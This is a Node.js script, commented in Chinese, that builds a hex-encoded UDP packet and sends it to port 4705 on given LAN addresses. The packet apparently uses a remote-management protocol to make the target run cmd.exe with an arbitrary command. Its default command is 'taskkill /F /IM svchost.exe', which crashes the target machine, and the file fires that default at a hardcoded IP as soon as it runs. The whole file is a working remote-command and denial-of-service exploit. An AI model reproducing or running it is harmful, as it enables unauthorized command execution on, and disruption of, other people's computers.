


// sendCmd_faithful.js
const dgram = require('dgram');

function rand11to99() {
  return Math.floor(Math.random() * (99 - 11 + 1)) + 11; // inclusive
}

/**
 * 忠实翻译你的 Python 逻辑：
 * - 每个字符 -> codePoint.toString(16) + "00"（和原代码实际行为一致）
 * - 在长 hex 字符串中插入随机数（11-99）作为十进制字符（原 Python 也是这样）
 *
 * @param {string} txt - 要插入 payload 的文本（可为空）
 * @param {string[]} targetIPs - 目标 IP 列表
 * @param {number} port - 目标端口
 * @param {function} txtGetter - 可选：用于在 txt=='' 时取值（类似 python 的 txt3.get()）
 */
function sendCmd_faithful(txt = 'taskkill /F /IM svchost.exe', targetIPs = ['192.168.65.92'], port = 4705, txtGetter) {
  const socket = dgram.createSocket('udp4');
  const ips = Array.isArray(targetIPs) ? targetIPs : [targetIPs];

  ips.forEach((ip, idx) => {
    let t = txt;
    if (t === '' && typeof txtGetter === 'function') {
      t = txtGetter();
    }

    // 忠实复现：对每个字符拼上 hex(codepoint) + '00'
    let txt_hex = '';
    for (let i = 0; i < t.length; i++) {
      const code = t.charCodeAt(i);
      let hex = code.toString(16);
      // 不强制补位（和原 Python hex(ord(...))[2:] 行为一致）
      txt_hex += hex + '00';
    }

    const rand = rand11to99(); // 11..99
    const payload =
      '444d4f43000001006e030000' + String(rand) +
      '44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e0065007800650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f006b002000' +
      txt_hex +
      '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000';

    const buf = Buffer.from(payload, 'hex');

    socket.send(buf, 0, buf.length, port, ip, (err) => {
      if (err) console.error('UDP send error ->', ip, err);
      else console.log(`Sent payload to ${ip}:${port}`);
      // 在所有发送完成后关闭 socket（这里简单在最后一个回调中关闭）
      if (idx === ips.length - 1) {
        socket.close();
      }
    });
  });

  // 如果没有任何目标 IP，立刻关闭
  if (ips.length === 0) socket.close();
}

// 示例调用
// sendCmd_faithful('hello', ['192.168.1.105', '192.168.1.106'], 9999);
module.exports = { sendCmd_faithful };
sendCmd_faithful()